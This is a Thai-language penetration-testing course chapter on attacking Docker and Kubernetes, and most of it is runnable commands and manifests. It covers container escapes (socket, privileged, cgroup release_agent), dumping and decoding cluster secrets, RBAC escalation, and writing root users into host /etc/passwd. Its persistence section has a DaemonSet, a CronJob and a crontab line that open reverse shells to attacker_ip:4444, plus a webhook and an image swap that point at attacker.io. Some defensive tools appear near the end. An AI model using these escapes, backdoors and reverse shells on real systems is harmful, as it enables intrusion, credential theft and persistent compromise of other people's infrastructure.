# Part 14: Container Security - Docker & Kubernetes (Steps 131-140)

## บทนำ

Container Security เป็นหัวข้อที่สำคัญมากในยุคที่ทุกองค์กรใช้ Docker และ Kubernetes ในการ deploy applications การทำ Container Penetration Testing ต้องเข้าใจทั้ง Container Enumeration, Container Escape, Kubernetes Attack, และ Supply Chain Attack

---

## Step 131: Docker Security Basics & Enumeration

```bash
# ==========================================
# Docker Security Enumeration
# ==========================================

# ==========================================
# 1. ตรวจสอบว่าอยู่ใน Container
# ==========================================

# วิธีตรวจสอบว่าเราอยู่ใน Docker container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
cat /etc/os-release

# ถ้าอยู่ใน container:
# /proc/1/cgroup จะมี "docker" หรือ container ID
# /.dockerenv ไฟล์นี้มีอยู่

# ==========================================
# 2. Container Enumeration (จากภายนอก)
# ==========================================

# List containers
docker ps
docker ps -a  # รวมที่หยุดแล้ว

# Container details
docker inspect container-name
docker inspect container-name | python3 -m json.tool

# Images
docker images
docker history image-name

# Networks
docker network ls
docker network inspect bridge

# Volumes
docker volume ls
docker volume inspect volume-name

# ==========================================
# 3. ตรวจสอบ Docker Daemon Security
# ==========================================

# Docker daemon configuration
cat /etc/docker/daemon.json

# ตรวจสอบ Docker socket permissions
ls -la /var/run/docker.sock
stat /var/run/docker.sock

# ตรวจสอบว่า Docker API exposed ไหม
curl http://localhost:2375/version
curl http://localhost:2376/version  # TLS

# Port scan สำหรับ Docker API
nmap -p 2375,2376 target_ip

# ==========================================
# 4. ตรวจสอบ Container Configuration
# ==========================================

# ดู capabilities
docker inspect container | grep -i cap

# Privileged mode
docker inspect container | grep -i privileged

# Mount points
docker inspect container | grep -A20 '"Mounts"'

# Environment variables
docker inspect container | grep -A50 '"Env"'

# ==========================================
# 5. ตรวจสอบ Docker Images
# ==========================================

# Scan for secrets ใน image layers
docker save image:tag | tar -xO | strings | grep -E "(password|secret|key|token|AKIA)"

# ใช้ Trivy
trivy image image:tag

# ใช้ Grype
grype image:tag

# ใช้ Syft (SBOM)
syft image:tag

# ใช้ Hadolint (Dockerfile linting)
hadolint Dockerfile
```

---

## Step 132: Docker Escape Techniques

```bash
# ==========================================
# Docker Container Escape
# ==========================================

# ==========================================
# 1. Docker Socket Escape
# ==========================================

# ตรวจสอบว่า Docker socket mount อยู่ใน container
ls -la /var/run/docker.sock

# ถ้ามี -> Escape ได้!
# วิธีที่ 1: รัน container ใหม่ที่ mount root
docker run -it -v /:/host ubuntu chroot /host /bin/bash

# วิธีที่ 2: สร้าง privileged container
docker run --privileged -it ubuntu /bin/bash

# วิธีที่ 3: ผ่าน API ถ้า socket available
curl --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -X POST http://localhost/containers/create \
    -d '{"Image":"ubuntu","Cmd":["/bin/sh"],"Binds":["/:/host"]}'

# ==========================================
# 2. Privileged Container Escape
# ==========================================

# ตรวจสอบว่า privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = Full privileges

# Mount host filesystem
mkdir /tmp/host
mount /dev/sda1 /tmp/host  # หรือ /dev/xvda1 บน AWS

# chroot เข้า host
chroot /tmp/host /bin/bash

# เพิ่ม user เข้า /etc/passwd
echo "hacker:x:0:0:root:/root:/bin/bash" >> /tmp/host/etc/passwd

# ==========================================
# 3. Capability Abuse
# ==========================================

# ตรวจสอบ capabilities
capsh --print
cat /proc/self/status | grep Cap

# CAP_SYS_ADMIN - สามารถ mount ได้
# CAP_NET_ADMIN - network configuration
# CAP_SYS_PTRACE - debug processes

# Escape ด้วย CAP_SYS_ADMIN + mount
# สร้าง cgroup escape:
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# สร้าง command file
cat > /cmd << 'EOF'
#!/bin/sh
ps aux > /tmp/output
EOF
chmod a+x /cmd

# Trigger
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/output

# ==========================================
# 4. nsenter Escape
# ==========================================

# ถ้า --pid=host หรือ nsenter available
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# ==========================================
# 5. Mounted Secrets / ConfigMaps
# ==========================================

# ค้นหา secrets ที่ mount ใน container
find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
find /var/run/secrets -type f 2>/dev/null

# Kubernetes service account token (ถ้าอยู่ใน k8s)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# ==========================================
# 6. Writable Host Path
# ==========================================

# ตรวจสอบ mount points
cat /proc/mounts
mount | grep host

# ถ้า /etc ถูก mount
echo "hacker::0:0::/:/bin/bash" >> /host-etc/passwd

# ถ้า crontabs ถูก mount
echo "* * * * * root /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /host-crontabs/root
```

---

## Step 133: Kubernetes Enumeration

```bash
# ==========================================
# Kubernetes Enumeration
# ==========================================

# ==========================================
# 1. kubectl Setup
# ==========================================

# ติดตั้ง kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
sudo mv kubectl /usr/local/bin/

# Configure credentials
export KUBECONFIG=/path/to/kubeconfig
kubectl config view
kubectl config get-contexts

# ==========================================
# 2. Basic Enumeration
# ==========================================

# ตรวจสอบ identity
kubectl auth whoami
kubectl auth can-i --list

# Namespaces
kubectl get namespaces
kubectl get all -A  # ทุก resources ทุก namespace

# Pods
kubectl get pods -A
kubectl describe pod pod-name -n namespace

# Services
kubectl get services -A

# Deployments
kubectl get deployments -A

# ConfigMaps
kubectl get configmaps -A
kubectl get configmap config-name -o yaml -n namespace

# Secrets
kubectl get secrets -A
kubectl get secret secret-name -o yaml -n namespace
# Decode
kubectl get secret secret-name -n namespace -o jsonpath='{.data}' | \
    python3 -c "import sys,json,base64;d=json.load(sys.stdin);[print(f'{k}: {base64.b64decode(v).decode()}') for k,v in d.items()]"

# ServiceAccounts
kubectl get serviceaccounts -A

# Roles & ClusterRoles
kubectl get roles -A
kubectl get clusterroles

# RoleBindings
kubectl get rolebindings -A
kubectl get clusterrolebindings

# ==========================================
# 3. RBAC Analysis
# ==========================================

# ตรวจสอบ permissions
kubectl auth can-i create pods
kubectl auth can-i get secrets -n kube-system
kubectl auth can-i "*" "*"  # cluster admin?

# ค้นหา roles ที่ bind กับ serviceaccount
kubectl get clusterrolebindings -o json | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    for subject in item.get('subjects', []):
        if subject.get('kind') == 'ServiceAccount':
            print(f\"{item['metadata']['name']} -> {subject['namespace']}/{subject['name']}\")
"

# ==========================================
# 4. ค้นหา Sensitive Information
# ==========================================

# Environment variables ทุก pods
kubectl get pods -A -o json | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    for container in item['spec'].get('containers', []):
        for env in container.get('env', []):
            val = env.get('value', '')
            if any(k in env['name'].lower() for k in ['password','secret','key','token']):
                print(f\"{item['metadata']['name']}: {env['name']}={val}\")
"

# ==========================================
# 5. Network Policies
# ==========================================

kubectl get networkpolicies -A
kubectl describe networkpolicy policy-name -n namespace
```

---

## Step 134: Kubernetes Attack Techniques

```bash
# ==========================================
# Kubernetes Attack Techniques
# ==========================================

# ==========================================
# 1. ServiceAccount Token Abuse
# ==========================================

# จาก inside container
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# API Server URL
APISERVER=https://kubernetes.default.svc

# ใช้ token
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# ==========================================
# 2. Exec เข้า Pod
# ==========================================

kubectl exec -it pod-name -- /bin/bash
kubectl exec -it pod-name -n namespace -- /bin/sh

# ==========================================
# 3. Pod Escape / Privilege Escalation
# ==========================================

# สร้าง privileged pod (ถ้ามีสิทธิ์)
cat > /tmp/privileged-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  containers:
  - name: escape
    image: ubuntu
    command: ["/bin/bash"]
    args: ["-c", "chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
  restartPolicy: Never
EOF

kubectl apply -f /tmp/privileged-pod.yaml
kubectl exec -it escape-pod -- /bin/bash

# ==========================================
# 4. Kubernetes Secrets Enumeration
# ==========================================

# ดึง secrets ทั้งหมด
kubectl get secrets -A -o json | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    secret_type = item.get('type', '')
    print(f'=== {ns}/{name} ({secret_type}) ===')
    for k, v in item.get('data', {}).items():
        try:
            decoded = base64.b64decode(v).decode()
            print(f'  {k}: {decoded[:100]}')
        except:
            print(f'  {k}: [binary]')
"

# ==========================================
# 5. ETCD Attack
# ==========================================

# etcd มี all cluster data รวมถึง secrets ที่ไม่ได้ encrypt
# ถ้าเข้าถึง etcd ได้:

# ตรวจสอบ etcd port
nmap -p 2379,2380 master_ip

# ดึงข้อมูลจาก etcd (ถ้าไม่มี auth)
etcdctl --endpoints=https://127.0.0.1:2379 \
    --cacert=/etc/kubernetes/pki/etcd/ca.crt \
    --cert=/etc/kubernetes/pki/etcd/server.crt \
    --key=/etc/kubernetes/pki/etcd/server.key \
    get / --prefix --keys-only

# ดึง secrets
etcdctl --endpoints=https://127.0.0.1:2379 \
    --cacert=/etc/kubernetes/pki/etcd/ca.crt \
    --cert=/etc/kubernetes/pki/etcd/server.crt \
    --key=/etc/kubernetes/pki/etcd/server.key \
    get /registry/secrets/ --prefix

# ==========================================
# 6. Lateral Movement ใน Cluster
# ==========================================

# ค้นหา pods ในทุก namespaces
kubectl get pods -A -o wide

# Port forward
kubectl port-forward pod-name 8080:80 -n namespace

# ==========================================
# 7. Kubernetes Dashboard Attack
# ==========================================

# หา dashboard service
kubectl get services -A | grep dashboard

# ถ้า dashboard exposed โดยไม่มี auth
# เข้าถึง http://master_ip:30000

# ดึง admin token
kubectl -n kubernetes-dashboard describe secret \
    $(kubectl -n kubernetes-dashboard get secret | grep admin | awk '{print $1}')
```

---

## Step 135: Kubernetes Privilege Escalation

```bash
# ==========================================
# Kubernetes Privilege Escalation
# ==========================================

# ==========================================
# 1. RBAC Escalation
# ==========================================

# ถ้ามีสิทธิ์ create ClusterRoleBinding
kubectl create clusterrolebinding pwned \
    --clusterrole=cluster-admin \
    --serviceaccount=default:default

# ถ้ามีสิทธิ์ update roles
kubectl patch clusterrole view \
    --type='json' \
    -p='[{"op": "add", "path": "/rules/-", "value": {"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'

# ==========================================
# 2. Impersonation
# ==========================================

# ถ้ามี impersonate verb
kubectl auth can-i impersonate serviceaccounts
kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system

# ==========================================
# 3. Kubernetes Token Escalation
# ==========================================

# ค้นหา tokens ที่มีสิทธิ์สูง
# ใน pod ที่มี automountServiceAccountToken
for pod in $(kubectl get pods -n kube-system -o name); do
    echo "=== $pod ==="
    kubectl exec $pod -n kube-system -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
done

# ==========================================
# 4. Node Attack
# ==========================================

# สร้าง pod ที่ nodeSelector ไปยัง master node
cat > /tmp/master-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: master-attack
  namespace: kube-system
spec:
  hostPID: true
  hostNetwork: true
  nodeSelector:
    node-role.kubernetes.io/control-plane: ""
  tolerations:
  - operator: "Exists"
  containers:
  - name: attack
    image: ubuntu
    command: ["/bin/bash", "-c", "nsenter -t 1 -m -u -n -i -- /bin/bash"]
    securityContext:
      privileged: true
  restartPolicy: Never
EOF

kubectl apply -f /tmp/master-pod.yaml
kubectl exec -it master-attack -n kube-system -- /bin/bash

# ==========================================
# 5. Kubelet API Attack
# ==========================================

# Kubelet API port 10250
# ถ้าไม่มี auth:
curl https://node_ip:10250/pods/ -k

# Exec ใน pod ผ่าน Kubelet
curl -k -X POST https://node_ip:10250/run/NAMESPACE/POD/CONTAINER \
    -d "cmd=id"
```

---

## Step 136: Kubernetes Persistence & Backdoors

```bash
# ==========================================
# Kubernetes Persistence
# ==========================================

# ==========================================
# 1. Malicious DaemonSet
# ==========================================

# DaemonSet รันบนทุก node
cat > /tmp/backdoor-ds.yaml << 'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: system-monitor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: system-monitor
  template:
    metadata:
      labels:
        app: system-monitor
    spec:
      hostPID: true
      hostNetwork: true
      tolerations:
      - operator: "Exists"
      containers:
      - name: monitor
        image: ubuntu
        command: ["/bin/bash", "-c"]
        args: ["while true; do bash -i >& /dev/tcp/attacker_ip/4444 0>&1; sleep 60; done"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
EOF

kubectl apply -f /tmp/backdoor-ds.yaml

# ==========================================
# 2. Webhook Backdoor
# ==========================================

# MutatingWebhookConfiguration - inject ใน pod ทุกตัวที่สร้าง
cat > /tmp/malicious-webhook.yaml << 'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: "malicious-webhook"
webhooks:
- name: "inject.attacker.io"
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  clientConfig:
    url: "https://attacker.io/webhook"
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF

# ==========================================
# 3. Persist ผ่าน CronJob
# ==========================================

cat > /tmp/reverse-cronjob.yaml << 'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-cleanup
  namespace: kube-system
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: cleanup
            image: ubuntu
            command: ["/bin/bash", "-c", "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"]
          restartPolicy: OnFailure
EOF

kubectl apply -f /tmp/reverse-cronjob.yaml

# ==========================================
# 4. Compromise ServiceAccount
# ==========================================

# สร้าง secret token สำหรับ service account
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Secret
metadata:
  name: backdoor-token
  annotations:
    kubernetes.io/service-account.name: default
type: kubernetes.io/service-account-token
EOF

# ==========================================
# 5. Supply Chain Attack
# ==========================================

# แก้ image registry ใน deployments
kubectl set image deployment/app container=attacker.io/malicious:latest

# หรือ patch directly
kubectl patch deployment app \
    -p '{"spec":{"template":{"spec":{"containers":[{"name":"app","image":"attacker.io/malicious:latest"}]}}}}'
```

---

## Step 137: Container Image Security

```bash
# ==========================================
# Container Image Security
# ==========================================

# ==========================================
# 1. Image Scanning
# ==========================================

# Trivy - comprehensive scanner
sudo apt install trivy

# Scan image
trivy image nginx:latest

# Scan local tarball
docker save nginx:latest > nginx.tar
trivy image --input nginx.tar

# Scan Dockerfile
trivy config Dockerfile

# Scan IaC
trivy config ./k8s-manifests/

# Output formats
trivy image nginx:latest --format json > trivy-report.json
trivy image nginx:latest --format sarif > trivy-report.sarif

# ==========================================
# 2. ค้นหา Secrets ใน Images
# ==========================================

# Trufflehog
docker run --rm trufflesecurity/trufflehog:latest \
    docker --image nginx:latest

# Dockle - container linter
docker run --rm \
    -v /var/run/docker.sock:/var/run/docker.sock \
    goodwithtech/dockle:latest \
    nginx:latest

# ==========================================
# 3. Dockerfile Best Practices
# ==========================================

# วิเคราะห์ Dockerfile อย่างละเอียด
cat > /tmp/analyze_dockerfile.sh << 'EOF'
#!/bin/bash
DOCKERFILE=${1:-Dockerfile}

echo "=== Checking for hardcoded secrets ==="
grep -n "PASSWORD\|SECRET\|TOKEN\|API_KEY\|PRIVATE_KEY" $DOCKERFILE

echo "=== Checking for dangerous commands ==="
grep -n "curl.*\|.*sh\|wget.*\|.*sh\|chmod 777\|chmod a+x" $DOCKERFILE

echo "=== Checking USER instruction ==="
grep -n "^USER" $DOCKERFILE || echo "WARNING: No USER instruction - running as root!"

echo "=== Checking EXPOSE ==="
grep -n "^EXPOSE" $DOCKERFILE

echo "=== Checking for latest tags ==="
grep -n "FROM.*:latest\|FROM.*[^:]$" $DOCKERFILE
EOF

bash /tmp/analyze_dockerfile.sh Dockerfile

# ==========================================
# 4. ตรวจสอบ Image Layers
# ==========================================

# ดู history
docker history --no-trunc image:tag

# ดู layers ด้วย dive
# ติดตั้ง dive
wget https://github.com/wagoodman/dive/releases/latest/download/dive_linux_amd64.tar.gz
tar -xzf dive_linux_amd64.tar.gz

# วิเคราะห์ image
./dive image:tag

# Extract layers manually
mkdir /tmp/layers
docker save image:tag | tar -xC /tmp/layers
# แต่ละ layer เป็น tar file
find /tmp/layers -name "layer.tar" -exec tar -tvf {} \;

# ==========================================
# 5. Container Registry Attack
# ==========================================

# ค้นหา credentials สำหรับ registry
cat ~/.docker/config.json
kubectl get secret -A | grep docker

# ตรวจสอบ unauthenticated access
curl https://registry.example.com/v2/
curl https://registry.example.com/v2/_catalog

# Pull ทุก images จาก registry (ถ้า anonymous access)
REGISTRY="registry.example.com"
repos=$(curl -s https://$REGISTRY/v2/_catalog | python3 -c "import sys,json;[print(r) for r in json.load(sys.stdin)['repositories']]")
for repo in $repos; do
    tags=$(curl -s https://$REGISTRY/v2/$repo/tags/list | python3 -c "import sys,json;[print(t) for t in json.load(sys.stdin).get('tags',[])]")
    for tag in $tags; do
        echo "Found: $repo:$tag"
        docker pull $REGISTRY/$repo:$tag
    done
done
```

---

## Step 138: Kubernetes Network Security

```bash
# ==========================================
# Kubernetes Network Security
# ==========================================

# ==========================================
# 1. Network Policy Analysis
# ==========================================

# ดู network policies
kubectl get networkpolicies -A
kubectl describe networkpolicy policy-name -n namespace

# ดู ingress/egress rules
kubectl get networkpolicies -A -o json | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    spec = item['spec']
    print(f'Policy: {ns}/{name}')
    print(f'  PodSelector: {spec.get(\"podSelector\", {})}')
    print(f'  Ingress rules: {len(spec.get(\"ingress\", []))}')
    print(f'  Egress rules: {len(spec.get(\"egress\", []))}')
"

# ==========================================
# 2. Service Discovery & Exploitation
# ==========================================

# จาก inside pod
# ค้นหา services ผ่าน DNS
nslookup kubernetes.default.svc.cluster.local
nslookup kube-dns.kube-system.svc.cluster.local

# Environment variables จาก services
env | grep SERVICE

# Scan internal network
# ใน pod ที่มี nmap
nmap -sn 10.96.0.0/12  # Cluster IP range
nmap -sV 10.96.0.1     # Kubernetes API

# ==========================================
# 3. Service Mesh Attack
# ==========================================

# Istio/Envoy sidecar injection
# ตรวจสอบ Istio
kubectl get namespace -L istio-injection
kubectl get pods -n istio-system

# ดึง mTLS certificates
kubectl exec deployment/app -c istio-proxy -- \
    cat /etc/certs/cert-chain.pem

# ==========================================
# 4. Ingress Attack
# ==========================================

# ค้นหา Ingress configurations
kubectl get ingress -A
kubectl describe ingress ingress-name -n namespace

# ตรวจสอบ wildcard certificates
kubectl get secrets -A | grep tls
kubectl get secret tls-secret -o yaml | python3 -c "
import sys, json, base64
data = __import__('yaml').safe_load(sys.stdin)
cert = base64.b64decode(data['data']['tls.crt']).decode()
print(cert[:500])
"

# ==========================================
# 5. DNS Spoofing ใน Cluster
# ==========================================

# ถ้าอยู่ใน pod และมีสิทธิ์ create CoreDNS configmap
kubectl get configmap coredns -n kube-system -o yaml

# ==========================================
# 6. Kubernetes API Server Attack
# ==========================================

# Anonymous access (ถ้าเปิด)
curl https://k8s_api:6443/api/v1/namespaces --insecure

# หา API Server
kubectl cluster-info

# ตรวจสอบ audit logs
kubectl logs -n kube-system kube-apiserver-* | grep "verb=create"
```

---

## Step 139: Advanced Container Escape

```bash
# ==========================================
# Advanced Container Escape Techniques
# ==========================================

# ==========================================
# 1. CVE-2019-5736 (runc exploit)
# ==========================================

# ช่องโหว่ใน runc
# ทำให้ overwrite runc binary บน host

# ตรวจสอบ runc version
runc --version

# ==========================================
# 2. CVE-2020-15257 (Containerd escape)
# ==========================================

# Shim API socket exposed
ls /run/containerd/

# ==========================================
# 3. Kernel Exploits จาก Container
# ==========================================

# ถ้า container ใช้ kernel version ที่มีช่องโหว่
uname -r

# Dirty Pipe (CVE-2022-0847) จาก container
# ทำให้ overwrite files บน host

# ==========================================
# 4. GPU/Device Escape
# ==========================================

# ถ้า container มีสิทธิ์เข้าถึง devices
ls /dev/
# /dev/mem - access host memory
# /dev/kmem - kernel memory

# ==========================================
# 5. proc filesystem escape
# ==========================================

# อ่าน host processes
ls /proc/
cat /proc/1/cmdline
cat /proc/1/environ
ls /proc/1/fd  # file descriptors ของ PID 1

# ==========================================
# 6. User Namespace Attack
# ==========================================

# ตรวจสอบ user namespace
cat /proc/self/uid_map
cat /proc/self/gid_map

# ==========================================
# 7. Container-to-Container Attack
# ==========================================

# ใน Kubernetes pod ที่แชร์ network
# scan containers อื่นบน same pod
# พวกนี้แชร์ localhost

# ==========================================
# 8. Automated Container Escape
# ==========================================

#!/usr/bin/env python3
# container_escape_check.py

import os
import subprocess

checks = {
    "docker_socket": ["/var/run/docker.sock"],
    "privileged": ["/proc/sys/kernel/dmesg_restrict"],
    "kubernetes_token": ["/var/run/secrets/kubernetes.io/serviceaccount/token"],
    "host_mounts": ["/host", "/rootfs", "/host-root"]
}

print("[*] Container Escape Opportunity Check")
print("=" * 50)

# Check Docker socket
if os.path.exists("/var/run/docker.sock"):
    print("[!] DOCKER SOCKET FOUND - escape possible!")
    print("    Run: docker run -it -v /:/host ubuntu chroot /host /bin/bash")

# Check privileged
try:
    with open("/proc/self/status") as f:
        for line in f:
            if "CapEff" in line:
                cap_val = int(line.split()[1], 16)
                if cap_val == 0x3fffffffff:
                    print("[!] PRIVILEGED CONTAINER - full capabilities!")
except:
    pass

# Check Kubernetes token
k8s_token = "/var/run/secrets/kubernetes.io/serviceaccount/token"
if os.path.exists(k8s_token):
    print(f"[!] KUBERNETES TOKEN FOUND: {k8s_token}")
    with open(k8s_token) as f:
        token = f.read().strip()
    print(f"    Token: {token[:50]}...")

# Check host mounts
for mount in ["/host", "/rootfs", "/host-root"]:
    if os.path.exists(mount) and os.path.exists(f"{mount}/etc/passwd"):
        print(f"[!] HOST MOUNT FOUND at {mount}")
        print(f"    Run: chroot {mount} /bin/bash")

# Check capabilities
result = subprocess.run(["capsh", "--print"], capture_output=True, text=True)
if "cap_sys_admin" in result.stdout.lower():
    print("[!] CAP_SYS_ADMIN - can mount filesystems!")

print("\n[*] Check complete")
```

---

## Step 140: Container Security Tools & Automation

```bash
# ==========================================
# Container Security Tools
# ==========================================

# ==========================================
# 1. Falco - Runtime Security
# ==========================================

# ติดตั้ง Falco
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco --namespace falco --create-namespace

# ดู Falco alerts
kubectl logs -n falco -l app.kubernetes.io/name=falco

# Custom rules
cat > /etc/falco/custom_rules.yaml << 'EOF'
- rule: Suspicious Container Activity
  desc: Detect exec in container
  condition: spawned_process and container and proc.name != "pause"
  output: "Exec in container (user=%user.name command=%proc.cmdline container=%container.name)"
  priority: WARNING
EOF

# ==========================================
# 2. kube-bench - CIS Benchmark
# ==========================================

# รัน kube-bench
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs -n default kube-bench

# หรือ run locally
./kube-bench --config-dir ./cfg --config ./cfg/config.yaml

# ==========================================
# 3. kube-hunter - Kubernetes Penetration Testing
# ==========================================

pip3 install kube-hunter

# External scan
kube-hunter --remote k8s_cluster_ip

# Internal scan (จาก inside cluster)
kube-hunter --pod

# Active hunt
kube-hunter --active

# ==========================================
# 4. kubesec - Security Risk Analysis
# ==========================================

# Online scan
curl -sSX POST --data-binary @pod.yaml https://v2.kubesec.io/scan

# Local
kubectl get pod pod-name -o yaml | kubesec scan -

# ==========================================
# 5. Checkov - IaC Security
# ==========================================

pip3 install checkov

# Scan Kubernetes manifests
checkov -d ./k8s-manifests

# Scan Terraform
checkov -d ./terraform

# Scan Dockerfile
checkov -f Dockerfile

# ==========================================
# 6. Full Container Pentest Script
# ==========================================

#!/bin/bash
# k8s_pentest.sh - Quick Kubernetes Pentest

TARGET_K8S="https://k8s_api:6443"
OUTPUT_DIR="k8s_pentest_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "[*] Starting Kubernetes Penetration Test"
echo "Target: $TARGET_K8S"
echo "Output: $OUTPUT_DIR"
echo "================================"

# Gather basic info
echo "[*] Cluster Info"
kubectl cluster-info > $OUTPUT_DIR/cluster-info.txt 2>&1

# Enumerate all resources
echo "[*] Enumerating resources..."
kubectl get all -A > $OUTPUT_DIR/all-resources.txt 2>&1
kubectl get secrets -A > $OUTPUT_DIR/secrets-list.txt 2>&1
kubectl get configmaps -A > $OUTPUT_DIR/configmaps-list.txt 2>&1
kubectl get roles,clusterroles -A > $OUTPUT_DIR/roles.txt 2>&1
kubectl get rolebindings,clusterrolebindings -A > $OUTPUT_DIR/bindings.txt 2>&1

# Check permissions
echo "[*] Checking permissions..."
kubectl auth can-i "*" "*" > $OUTPUT_DIR/permissions.txt 2>&1
kubectl auth can-i --list > $OUTPUT_DIR/all-permissions.txt 2>&1

# Scan for exposed services
echo "[*] Checking exposed services..."
kubectl get services -A -o wide > $OUTPUT_DIR/services.txt 2>&1

# Check network policies
kubectl get networkpolicies -A > $OUTPUT_DIR/netpolicies.txt 2>&1

# Run kube-hunter if available
if command -v kube-hunter &> /dev/null; then
    echo "[*] Running kube-hunter..."
    kube-hunter --remote $TARGET_K8S --report json > $OUTPUT_DIR/kube-hunter.json 2>&1
fi

echo "[+] Pentest complete! Results saved to $OUTPUT_DIR/"
ls -la $OUTPUT_DIR/
```

---

## สรุป Part 14

ในบทนี้คุณได้เรียนรู้:

✅ **Step 131**: Docker Security Basics & Enumeration  
✅ **Step 132**: Docker Escape Techniques (Socket, Privileged, Capabilities)  
✅ **Step 133**: Kubernetes Enumeration (RBAC, Secrets, Roles)  
✅ **Step 134**: Kubernetes Attack Techniques (ServiceAccount, Pod Escape, ETCD)  
✅ **Step 135**: Kubernetes Privilege Escalation  
✅ **Step 136**: Kubernetes Persistence & Backdoors  
✅ **Step 137**: Container Image Security (Trivy, Dockle, Registry Attack)  
✅ **Step 138**: Kubernetes Network Security  
✅ **Step 139**: Advanced Container Escape  
✅ **Step 140**: Container Security Tools (Falco, kube-bench, kube-hunter)  

## เครื่องมือที่ใช้

| เครื่องมือ | ใช้สำหรับ |
|-----------|----------|
| Trivy | Image & IaC Vulnerability Scanning |
| kube-hunter | Kubernetes Penetration Testing |
| kube-bench | CIS Kubernetes Benchmark |
| Falco | Runtime Security Monitoring |
| Checkov | Infrastructure as Code Security |
| dive | Docker Image Layer Analysis |
| PACU | AWS Container Attack |

## แบบฝึกหัด

1. ใช้ KindKluster หรือ Minikube สร้าง local Kubernetes cluster
2. Deploy vulnerable application (DVWA/Juice Shop)
3. ทำ pod escape จาก privileged container
4. ทำ RBAC escalation ใน Kubernetes
5. ทำ HackTheBox Kubernetes challenges

## ถัดไป: Part 15 - Malware Development & Evasion

---

*Part 14 | Steps 131-140 | ระดับ: สูง-มืออาชีพ*
